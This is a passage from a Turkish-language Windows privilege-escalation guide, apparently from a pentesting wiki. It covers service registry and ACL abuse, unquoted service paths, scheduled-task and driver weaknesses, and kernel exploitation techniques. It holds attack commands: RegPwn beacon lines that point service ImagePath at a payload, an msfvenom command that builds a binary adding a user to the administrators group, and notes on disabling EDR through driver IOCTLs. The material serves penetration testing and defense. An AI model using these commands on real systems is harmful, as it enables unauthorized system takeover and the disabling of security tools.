Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, sistem açılışında otomatik olarak başlatılıp başlatılmadığını, yeniden başlatan bir failure action tanımlı olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Services registry modify permissions

Herhangi bir hizmetin registry anahtarını değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmetin **registry** anahtarı üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir service key üzerinde **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** için yazma yetkisi sağlayan registry permissions olup olmadığını inceleyin. Tek başına bir ACL girdisi etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry-key hakları, service object üzerindeki `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` haklarından ayrıdır. Privilege escalation için ayrıca kullanılabilir bir service configuration alanı, service'i tetikleme yolu ve daha ayrıcalıklı bir service identity gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) belgelerine bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink yarışıyla rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** süreci tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link yarışı**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değer yazma** primitive'i sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig**'e ekleyin.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` dosyasına bir **oplock** koyarak **yarışı kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini gösteren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilmiş HKLM yoluna yazar.

Rastgele HKLM değer yazma imkânını elde ettikten sonra servis yapılandırma değerlerinin üzerine yazarak LPE'ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir servis seçin (ör. **`msiserver`**) ve yazma işleminden sonra servisi tetikleyin. **Not:** genel kullanıma açık exploit implementasyonu, yarışın bir parçası olarak **iş istasyonunu kilitler**.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory izinleri

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows hizmetleri söz konusu olduğunda, bu **rastgele kod yürütmek için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Tırnak içine alınmamış hizmet yolları

Yürütülebilir dosyanın yolu tırnak içine alınmamışsa Windows, boşluktan önceki her olası bitişi yürütmeye çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları yürütmeye çalışır:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, bir hizmetin başarısız olması durumunda gerçekleştirilecek eylemleri kullanıcıların belirtmesine olanak tanır. Bu özellik, bir ikili dosyayı hedefleyecek şekilde yapılandırılabilir. Bu ikili dosya değiştirilebiliyorsa ayrıcalık yükseltme mümkün olabilir. Daha fazla bilgiye [resmî belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) ulaşabilirsiniz.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. Aynı durum PowerShell `-File` gibi bir yorumlayıcının açıkça belirtilen dosya bağımsız değişkeni için de geçerlidir. Zamanlanmış bir toplu iş dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullu ifadeler ve kabuk zincirleme işlemleri manuel olarak izlenmelidir. Çağıran hesabın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten ilgili eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucu oluşturur. Betikler için yalnızca sona eklemeye izin veren bir ACL önemli olabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına neden olabilir. Ayrıcalık yükseltmesi olduğunu ileri sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi ilkesini doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, içeriği sıradan bir dizin listelemesinde gösterilmeyen, adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, içerikleri açmadan önce akış **adlarını ve boyutlarını** inceleyin. Windows, bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutlarıyla gösterir. Bir sırrı işaret eden akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin hangi hesapla kimlik doğrulaması yaptığını kontrol edin. Rutin numaralandırma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizinden `command.txt`, `reboot.rsf` ve bir projeye ait `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` dosyasını içerir. Bu yardımcı programı ayrıcalıklı bir hesapla başlatan zamanlanmış bir görev veya hizmet, yardımcı programın yürütülebilir dosyası korunsa bile, bu girdilere düşük ayrıcalıklı yazma erişimini söz konusu hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** yan dosyanın da oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki yan dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın bulunduğu dizin, görevin girdilerini nereden okuduğunu doğrulamak için yalnızca bir ipucudur; kanıt değildir. Projenin çalışma dosyası ön koşulu da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**İkili dosyaların izinlerini** kontrol edin (birini üzerine yazarak ayrıcalıkları yükseltebilirsiniz) ve **klasörlerin** izinlerini de inceleyin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` konumuna yazan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü sürümün tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; yalnızca `2.1` gibi bir dal etiketi, sistemin etkilenip etkilenmediğini belirleyemez. Envanter çıkarma işlemi, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), 6210 ve önceki ADSelfService Plus sürümlerini etkiledi; üretici sorunu 6211 sürümünde düzeltti. Bu güvenlik açığı yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önem taşır. Bu nedenle, yüklü ürün girdisi veya hizmet yolu bir ipucudur, güvenlik açığı hükmü değildir: tam sürümü, SAML yapılandırma geçmişini, hizmetin ağ üzerinden erişilebilirliğini ve hangi hesapla çalıştığını doğrulayın. Hizmet üzerinden kod yürütme, o hesabın ayrıcalıklarını devralır; SYSTEM ile yürütme için örneğin SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilen bir `OfflineBackup_*.ezip`, kullanılabilir kimlik bilgisine veya bu SAML güvenlik açığına kanıt değil, ayrı bir şifrelenmiş yedekleme ipucudur. Rutin envanter çıkarma sırasında dosyayı açmadan yolunu ve erişim izinlerini kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller üzerinde, bir job oluşturma veya yapılandırma iznini onu başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` izinleri olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzaktan tetikleyici başka bir build yolu sağlayabilir; ancak etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Yürütme, controller'ın veya seçili agent'ın kimliğiyle gerçekleşir ve kayıtlı bir kimlik bilgisi yalnızca job ilgili kapsamda ona erişebiliyorsa kullanılabilir. Ayrıca, `JENKINS_HOME` meta verilerine erişimi inceleyin: Jenkins, kimlik bilgisi materyallerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına bir parolayı açığa çıkarmaz; paylaşılan çıktılarda gizli bilgileri yazdırmadan **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanımı yolunu doğrulayın. Bu hesabın bir AD kullanıcı nesnesi için `scriptPath` yazma izni varsa, bunu farklı kullanıcılar arası yürütme olarak değerlendirmeden önce yazılabilir bir betik yolu olduğunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış görev tüketicisi bulunduğunu doğrulayın. Daha fazla grup denetimi için etkin AD izinleri ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, bir pipeline **oluşturma veya düzenleme** iznini onu **kuyruğa alma** ve seçili agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap bir betik adımı gönderebiliyor ve pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, bu adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Farklı kullanıcı veya SYSTEM hesabına geçiş olduğunu öne sürmeden önce tam pipeline'ı, branch/kaynak kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir job'u ve agent hizmet kimliğini doğrulayın. Yüklü bir agent, proje rolü veya repository yazma izni tek başına yalnızca bir ipucudur; pasif envanter çıkarma sırasında build başlatmadan izinleri ve yerel hizmet meta verilerini inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) senkronizasyon hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabını**, dizin izinleri yapılandırılmış senkronizasyon özelliklerine bağlı olan **AD DS connector hesabından** ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir sync hizmeti, yerel yönetici hesabını çağrıştıran bir grup veya tek başına veritabanına görünürlük; çözülebilir bir kimlik bilgisi ya da domain ayrıcalık yükseltmesi olduğunu kanıtlamaz. Gerçek veritabanı okuma izinlerini, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter çıkarma yalnızca hizmet ve erişim meta verilerini göstermeli, saklanan gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Yazıcı sürücüsü destek DLL izinleri

Yüklü bir yazıcı sürücüsü, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir yazdırma işleminde yükleyebilir. Yazıcı WMI envanterine erişim engellense bile, üst dizinleri ve reparse point'leri de kapsayacak şekilde sürücünün tam dizinini ve DLL ACL'lerini inceleyin. [Ricoh yazıcı sürücüsü sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/), `PrintIsolationHost.exe` tarafından DLL yüklenmesini açıklıyor. Yazılabilir bir ACL yalnızca bir ipucudur: engelleme girdileri uygulandıktan sonra etkin yazma erişimini, ilgili sürücünün yüklü olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncel sürücüsünün veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adına veya sürücü sürümüne bakarak güvenlik açığı olduğunu varsaymayın.

### Yazma İzinleri

Özel bir dosyayı okumak için bir yapılandırma dosyasını değiştirebiliyor musunuz veya bir Yönetici hesabı tarafından çalıştırılacak (schedtasks) bir ikili dosyayı değiştirebiliyor musunuz, kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin otomatik yükleme ile kalıcılık/çalıştırma

Notepad++, `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry kaydının veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetki yükseltmek için ilginç autorun konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver'lar

Olası **üçüncü taraf şüpheli/açıklı** driver'ları arayın.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında sık görülür), kernel belleğinden doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager yolunu açtığı race-condition hatalarında, arama işlemini bilerek yavaşlatmak (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool ifşaları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki hatadan oluşturulabilir: kuyruk kilidi hâlâ tutulurken bir isteği/CBD'yi serbest bırakan bir **cancel-safe queue yaşam döngüsü yarışı** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool ayırmasını sızdıran bir **kopyalama öncesi kilit bırakma** ifşası.<sup>[[29]](#references)</sup>

Denetim ve exploit notları:

- **Kilit altında serbest bırakma + sonrasında iptal**: başarı yolunun **Acquire -> CompleteRequest/free -> Release**, iptal yolunun ise **Acquire -> RemoveIo(eski pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Başarı yolu, CBDQ/CSQ kilidini bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` çağrısına ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde engellenmiş bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA` nesnesini driver'ın remove callback'ine geçirebilir.
- Serbest bırakılan kuyruk nesnesini aynı boyutta, saldırganın kontrolündeki bir paged-pool ayırmasıyla **yeniden kullanın**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut kontrol edilebilir, ayrıca bunları daha sonra pipe read/peek işlemleriyle inceleyebilirsiniz. Serbest bırakılan nesne liste bağlantıları içeriyorsa, driver'ın özgün liste başlığında durması yerine saldırganın tanımladığı istek yapılarını tekrar tekrar işlemesi için bu bağlantıları **kullanıcı belleğindeki sahte istek düğümlerinden oluşan döngüsel bir listeyle** üzerine yazın.
- **Öngörülebilir bir yazmayı geliştirin**: sahte istek, muhasebe yazımlarında kullanılan iç içe bir context pointer'ını (timestamps / QPC / refcount'a bitişik alanlar) yeniden yönlendiriyorsa, **adresi kontrol edilebilen ancak değeri kontrol edilemeyen** bir kernel yazması elde edebilirsiniz. Bu durumda, son bir kod/veri pointer'ı yerine sprayed pool nesnesinin **length/size** alanını hedefleyin; ardından bozulmuş nesne bir **sınır dışı paged-pool read** sağlayana kadar spray'i tarayın.
- **Yarışa açık ifşa örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırganın kopyalanan buffer'ı büyütebilmesi güvenilirliği artırır (örneğin, serializer'ın son ayırmasının boyutunu artıran çok sayıda liste/kaynak girdisi ekleyerek); çünkü daha uzun bir kopyalama, makineyi çökertmeden değiştirme penceresini genişletir.
- **Pointer açısından zengin yeniden doldurma hedefleri**: Windows **I/O ring** kayıtlı buffer dizileri mükemmel ifşa hedefleridir; çünkü paged-pool boyutları saldırgan tarafından kontrol edilir (`8 * regBufferCnt`) ve her öğe bir `_IOP_MC_BUFFER_ENTRY` kernel pointer'ıdır. Bu dizilerden birini sızdırın, çevresindeki `IORING_OBJECT` nesnesini bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu girdileri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilir tek yazma işlemi kararlı bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir kullanıcı pointer'ı oluşturmak için **hizalanmamış örtüşen yazmalar** kullanın, bunu `VirtualAlloc` ile belleğe eşleyin ve sahte kayıtlı-buffer dizisini oraya yerleştirin.<sup>[[30]](#references)</sup>

Faydalı hata ayıklama göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring'den arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow ile bir SYSTEM token'ı çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitives

Modern hive güvenlik açıkları, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve metadata bozulmasını özel bir driver olmadan kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan denetimindeki path'lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path'i kabul eder, yalnızca geçerli bir UTF-16 string olup olmadığını doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'a `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa `EntryContext`, geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı denetimindeki mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **untrusted hive**'a erişirse, kernel çağıranlar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploitability'yi korumak için `HKCU` altında değerler hazırlamak yerine **trusted system hive'ların içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı çoğaltılmış bir **low-integrity** token'ıyla yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` içine yapılan 8-byte doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırgan kontrollü bir `REG_DWORD`'u stack scalar'ına yükler ve sonra aynı buffer'ı string okuması için yeniden kullanırsa, saldırgan `Length`/`MaximumLength`'i kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrol edilen bir kernel write elde eder.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext`'teki ilk `LONG`'u signed buffer size olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar'da saldırgan kontrollü **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu, saldırganın byte'larını doğrudan bitişik stack slot'larına kopyalar. Bu, callback pointer'ının tamamının üzerine yazmak için genellikle en temiz yoldur.

Güçlü bir arama örüntüsü: **aynı stack variable'a yeniden başlatmadan yapılan heterojen registry okumaları**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry okumasının ikinci okumanın gerçekleşip gerçekleşmeyeceğini belirlediği kod yolları için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadan, device ekstra bir component içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- İstenilen process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser ile SYSTEM shell).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence numaraları).
- Protected Process/Light (PP/PPL) dahil istenilen process'leri sonlandırma; böylece user land üzerinden kernel aracılığıyla AV/EDR kill.

Minimal PoC örüntüsü (user mode):
```c
// Example based on a vulnerable antimalware driver
